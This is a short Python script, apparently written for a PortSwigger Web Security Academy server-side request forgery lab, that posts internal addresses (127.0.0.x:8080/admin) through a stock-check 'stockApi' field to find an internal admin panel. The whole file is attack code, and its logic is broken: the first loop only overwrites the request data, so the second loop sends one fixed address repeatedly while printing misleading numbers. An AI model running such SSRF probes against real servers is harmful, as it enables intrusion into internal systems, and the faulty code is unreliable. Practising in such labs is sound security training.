import requests

url = 'https://0a9000b603c630f2c04dd5d3008700b1.web-security-academy.net/product/stock'


payload = "127.0.0.1"

for octect in range(1,254):
    data = {
        "stockApi": "127.0.0." + str(octect) + ":8080/admin"
    }

for octect in range(1,254):
    response = requests.post(url, data=data)
    if (response.status_code == 200):
        print("Number {}: Response {}".format(octect, response.text))
